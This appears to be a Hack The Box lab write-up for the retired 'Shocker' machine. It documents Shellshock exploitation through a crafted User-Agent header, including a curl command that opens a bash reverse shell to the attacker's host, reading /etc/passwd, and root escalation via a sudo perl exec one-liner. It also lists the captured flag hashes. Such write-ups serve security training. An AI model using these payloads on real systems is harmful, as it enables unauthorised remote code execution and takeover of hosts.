# HTB: Shocker

> **Hack The Box | Linux | Easy**  
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 16.04.3 LTS |
| **Difficulty** | Easy |
| **Category** | Linux / Shellshock / GTFOBins |
| **IP Address** | 10.129.43.197 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2014-6271 (Shellshock / Bash) |
| **Exploitation Method** | Manual: no Metasploit |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: ports 80 and 2222 |: |
| 2 | Gobuster: `/cgi-bin/` (403) → `user.sh` (200) discovered |: |
| 3 | Shellshock (CVE-2014-6271) via `User-Agent` header | `shelly` |
| 4 | TTY upgrade: `python3 + stty raw` | `shelly` |
| 5 | `sudo -l` → `/usr/bin/perl` NOPASSWD as root |: |
| 6 | GTFOBins: `sudo perl -e 'exec "/bin/sh"'` | `root` |

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA shocker 10.129.43.197
```

```
# Nmap 7.98 scan initiated Mon May 11 12:25:18 2026
Nmap scan report for 10.129.43.197
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 1347.20 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 80 | Apache 2.4.18 | Web server: primary attack surface |
| 2222 | OpenSSH 7.2p2 | Non-standard port: useful once credentials are found |

SSH on port 2222 is intentionally non-standard: the machine is named "Shocker" after the Shellshock vulnerability, and the web server is the entry point. Apache 2.4.18 on Ubuntu 16.04 is an aging install. The combination of Apache and Ubuntu 16.04 strongly suggests CGI scripts may be present: which is the Shellshock attack surface.

### Web Application: Initial Visit

Browsing to `http://10.129.43.197/` returns a plain page with minimal content: just an image with the text "Don't Bug Me!". No visible links, no forms, no javascript. The entire attack surface must be found through directory enumeration.

### Directory Brute-Force: Gobuster

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.43.197 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,pl,cgi \
  -t 50 \
  -o gobuster.txt
```

```
===============================================================
Gobuster v3.5
===============================================================
[+] Url:         http://10.129.43.197
[+] Extensions:  sh, pl, cgi
[+] Threads:     50
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/index.html           (Status: 200) [Size: 137]
===============================================================
```

`/cgi-bin/` returns **403 Forbidden**: the directory exists but directory listing is disabled. The directory itself is not accessible, but files inside it may be. Enumerate its contents:

```bash
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.43.197/cgi-bin/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x sh,pl,cgi \
  -t 50
```

```
===============================================================
/user.sh              (Status: 200) [Size: 118]
===============================================================
```

**`/cgi-bin/user.sh`**: a shell script served as a CGI endpoint. Status 200 means it's directly accessible and executing.

```bash
Hackerpatel007_1@htb[/htb]$ curl http://10.129.43.197/cgi-bin/user.sh
```

```
Content-Type: text/plain

Just an uptime FYI:
 22:12:43 up 10:03,  0 users,  load average: 0.00, 0.01, 0.00
```

The script executes and returns live uptime output. This is a CGI shell script: Apache executes it in a subprocess on each request and the response is the script's stdout. The key question: **is bash the shell interpreter, and is it a vulnerable version?**

Apache passes request headers to CGI scripts as environment variables. If `/bin/bash` is the interpreter and it is vulnerable to Shellshock (CVE-2014-6271), environment variables passed by Apache: including HTTP headers: will be interpreted as function definitions before the script body executes, allowing arbitrary command injection.

---

## Exploitation: Shellshock (CVE-2014-6271)

### Vulnerability Background

Shellshock is a critical vulnerability in GNU Bash versions ≤ 4.3. Bash allows function definitions to be exported via environment variables: a variable can contain a function body that Bash will parse and make available to child processes. The vulnerability lies in what Bash does **after** parsing the function: it continues executing any trailing commands after the closing `}`.

A malicious environment variable structured as:

```
() { :; }; <arbitrary_command>
```

...causes Bash to:

1. Parse `() { :; }` as a function definition (the `:` is a no-op)
2. Execute `<arbitrary_command>` as a trailing statement after the function

In the CGI context, Apache sets environment variables from HTTP request headers before executing the CGI script. The `User-Agent` header becomes `HTTP_USER_AGENT`. If Bash processes these environment variables on startup (which it does for CGI), the payload executes with the privileges of the web server process (`shelly`).

**Affected versions:** Bash ≤ 4.3 (patch: bash-4.3-patch-25 / bash-4.3-patch-26)

### Step 1: Verify RCE via User-Agent Injection

Test `id` to confirm command execution:

```bash
Hackerpatel007_1@htb[/htb]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'id'" \
  http://10.129.43.197/cgi-bin/user.sh
```

```
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Shellshock confirmed. Commands execute as `shelly`.

The two `echo` statements before the command inject blank lines to separate the HTTP response body from the command output: necessary because the Shellshock payload executes before the CGI script produces its `Content-Type` header. Without them, output may not render correctly.

### Step 2: Verify the Target User and Environment

```bash
Hackerpatel007_1@htb[/htb]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
  http://10.129.43.197/cgi-bin/user.sh
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash
```

One interactive user: `shelly` with `/bin/bash` as login shell.

```bash
Hackerpatel007_1@htb[/htb]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/shadow'" \
  http://10.129.43.197/cgi-bin/user.sh
```

```
(empty: no output)
```

`/etc/shadow` is not readable as `shelly`: expected. Password cracking is not an option here. A reverse shell is the path forward.

### Step 3: Reverse Shell via Shellshock

Start the listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvp 54321
```

```
listening on [any] 54321 ...
```

Trigger the reverse shell by injecting a bash `-i` redirect into the `User-Agent`:

```bash
Hackerpatel007_1@htb[/htb]$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.236/54321 0>&1'" \
  http://10.129.43.197/cgi-bin/user.sh
```

```
curl: (18) transfer closed with outstanding read data remaining
```

The `curl` error is expected: the reverse shell hijacks the HTTP response socket, causing curl to report an incomplete transfer. The important thing is the listener:

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.43.197] 48638
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

Shell received as `shelly`.

### Step 4: Full TTY Upgrade

The initial shell has no job control and limited functionality. Upgrade to a full interactive TTY:

```bash
# Step 1: Spawn PTY via Python3
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z
```

```
zsh: suspended  nc -lvp 54321
```

```bash
# Step 3: Set local terminal to raw mode and resume
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
```

```
[1]  + continued  nc -lvp 54321
```

```bash
# Step 4: Set environment variables for proper terminal behaviour
shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm
shelly@Shocker:/usr/lib/cgi-bin$ export SHELL=bash
shelly@Shocker:/usr/lib/cgi-bin$ stty rows 38 columns 116
```

Full interactive TTY with job control, tab completion, and proper arrow key support.

---

## Post-Exploitation: Initial Enumeration as shelly

### User Flags and Home Directory

```bash
shelly@Shocker:/usr/lib/cgi-bin$ cd /home/shelly
shelly@Shocker:/home/shelly$ ls
user.txt

shelly@Shocker:/home/shelly$ cat user.txt
dfe6a8a985187975c3eec860e0341e5a
```

### Group Membership

```bash
shelly@Shocker:/home/shelly$ id
```

```
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

Notable groups:

- `adm`: read access to system logs in `/var/log/`
- `lxd`: LXD container manager group

The `lxd` group membership immediately looks like a container escape path. Attempting it:

```bash
shelly@Shocker:/home/shelly$ lxc list
Generating a client certificate. This may take a minute...
error: mkdir /.config: permission denied

shelly@Shocker:/home/shelly$ lxd init --auto
error: This must be run as root
```

LXD escalation requires root to initialise the daemon. The `/.config` permission error confirms the environment isn't set up. **Dead end: move on.**

### sudo Enumeration

```bash
shelly@Shocker:/home/shelly$ sudo -l
```

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

**Critical finding:** `shelly` can run `/usr/bin/perl` as root without a password. Perl is a full-featured scripting language: this is a direct root escalation via GTFOBins.

---

## Privilege Escalation: sudo Perl GTFOBins

### Understanding the Misconfiguration

The sudo entry `(root) NOPASSWD: /usr/bin/perl` allows running the entire Perl interpreter as root. Perl's `exec()` function replaces the current process with a new command. Running `exec "/bin/sh"` as root via sudo spawns a root shell.

### Verify the Escalation Path

First, confirm `exec` works in Perl (without sudo: expect no privilege change):

```bash
shelly@Shocker:/home/shelly$ perl -e 'exec "/bin/sh"'
$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly)...
$ exit
```

As expected: `exec` works but privilege is unchanged without `sudo`. Now apply sudo:

### GTFOBins: sudo perl exec

```bash
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## Flag Collection

### user.txt

```bash
shelly@Shocker:/home/shelly$ cat /home/shelly/user.txt
```

```
dfe6a8a985187975c3eec860e0341e5a
```

### root.txt

```bash
# cat /root/root.txt
```

```
9980ec7e1c836cf948227d565ecd9995
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/shelly/user.txt` | `dfe6a8a985187975c3eec860e0341e5a` |
| **root.txt** | `/root/root.txt` | `9980ec7e1c836cf948227d565ecd9995` |

---

## Full Attack Chain Reference

```
[Recon] nmap -sS -sV -sC -p- → port 80 (Apache 2.4.18) + port 2222 (SSH)
    │
    ├─[Web] http://10.129.43.197 → minimal page, no attack surface visible
    │
    ├─[Gobuster] /cgi-bin/ → 403 (exists, listing disabled)
    │       └─ gobuster /cgi-bin/ -x sh → /cgi-bin/user.sh → 200
    │
    └─[Shellshock CVE-2014-6271]
            │
            ├─[Verify] User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'
            │           └─ uid=1000(shelly) ✓
            │
            └─[RCE] User-Agent: bash -i >& /dev/tcp/10.10.16.236/54321 0>&1
                    │
                    └─ nc -lvp 54321 → shelly@Shocker:/usr/lib/cgi-bin
                            │
                            ├─ TTY upgrade: python3 pty + stty raw + export TERM
                            │
                            ├─ cat /home/shelly/user.txt → dfe6a8a985187975c3eec860e0341e5a
                            │
                            ├─ id → groups include lxd (attempted, failed: no LXD init)
                            │
                            └─[sudo -l] → (root) NOPASSWD: /usr/bin/perl
                                    │
                                    └─[GTFOBins] sudo /usr/bin/perl -e 'exec "/bin/sh"'
                                            │
                                            └─ uid=0(root)
                                                    └─ cat /root/root.txt → 9980ec7e1c836cf948227d565ecd9995
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA shocker 10.129.43.197` | Full TCP scan |
| `gobuster dir -u http://10.129.43.197 -w directory-list-2.3-medium.txt -x sh,pl,cgi -t 50` | Web directory + extension scan |
| `gobuster dir -u http://10.129.43.197/cgi-bin/ -w directory-list-2.3-medium.txt -x sh,pl,cgi` | Enumerate CGI directory |
| `curl http://10.129.43.197/cgi-bin/user.sh` | Baseline CGI script response |
| `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://10.129.43.197/cgi-bin/user.sh` | Shellshock RCE verification |
| `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.236/54321 0>&1'" http://10.129.43.197/cgi-bin/user.sh` | Shellshock reverse shell trigger |
| `nc -lvp 54321` | Catch initial reverse shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Spawn PTY |
| `stty raw -echo; fg` | Full TTY upgrade: raw mode |
| `export TERM=xterm && export SHELL=bash && stty rows 38 columns 116` | Terminal environment setup |
| `id` | Check group membership (lxd, adm noted) |
| `sudo -l` | Enumerate sudo rights |
| `sudo /usr/bin/perl -e 'exec "/bin/sh"'` | GTFOBins root shell |
| `cat /home/shelly/user.txt` | User flag |
| `cat /root/root.txt` | Root flag |

---

## Lessons Learned

**1. A `403` on a directory is not a dead end: enumerate the contents.**  
`/cgi-bin/` returned 403 Forbidden, which stops many beginners. The directory listing is blocked but individual files inside are accessible. Always follow up a 403 on a known-interesting directory with a targeted scan of its contents using `-x sh,pl,cgi` extensions. That single follow-up scan found `user.sh`.

**2. CGI + Bash = think Shellshock immediately.**  
The combination of Apache, a `.sh` CGI script, and Ubuntu 16.04 is a Shellshock fingerprint. The vulnerability affects Bash ≤ 4.3 and Apache CGI is the classic delivery mechanism: HTTP headers become environment variables, which Bash processes on startup. When you see a shell script in `/cgi-bin/`, CVE-2014-6271 is the first thing to test.

**3. The two `echo` statements before the payload are not cosmetic.**  
`() { :; }; echo; echo; /bin/bash -c '...'`: the two extra `echo` calls inject blank lines that separate the injected output from the CGI Content-Type header. Without them, command output may be prepended with HTTP header content and fail to parse correctly. For a reverse shell this doesn't matter, but for data extraction commands it does.

**4. `curl: (18) transfer closed` is the expected response for a successful reverse shell trigger.**  
When the reverse shell hijacks the HTTP connection socket, curl sees the response terminate unexpectedly and reports error 18. This is not a failure: it is confirmation that the payload executed. The listener receives the connection. Don't mistake the curl error for a failed exploit.

**5. The LXD group doesn't always give an easy path.**  
`shelly` was in the `lxd` group: textbook container escape setup. But LXD requires `lxd init` to be run as root first, and `/.config` wasn't writable. Groups are attack surface hints, not guaranteed paths. Enumerate all possible vectors and prioritise by what's actually functional. `sudo -l` answered the question in two seconds.

**6. `sudo -l` answered the machine in two seconds.**  
The entire privilege escalation was one command: `sudo /usr/bin/perl -e 'exec "/bin/sh"'`. `perl` is a GTFOBins binary with a one-liner exec escape. On every machine, `sudo -l` is the first escalation check. It takes two seconds and often solves everything.

**7. The TTY upgrade sequence is a mandatory skill: not optional.**  
Without the full `python3 pty → Ctrl+Z → stty raw -echo → fg → export TERM → stty rows cols` sequence, interactive commands fail, tab completion doesn't work, and `sudo` prompts may not render correctly. Internalising this sequence is fundamental for both CTF and OSCP.

---

## References

- [CVE-2014-6271: NVD (Shellshock)](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [Shellshock: RedHat Security Blog](https://access.redhat.com/articles/1200223)
- [GTFOBins: perl](https://gtfobins.github.io/gtfobins/perl/)
- [Apache CGI Documentation](https://httpd.apache.org/docs/2.4/howto/cgi.html)

---

*HTB Retired Machine: Shocker | Completed May 2026 | Flags included per HTB retired machine policy.*
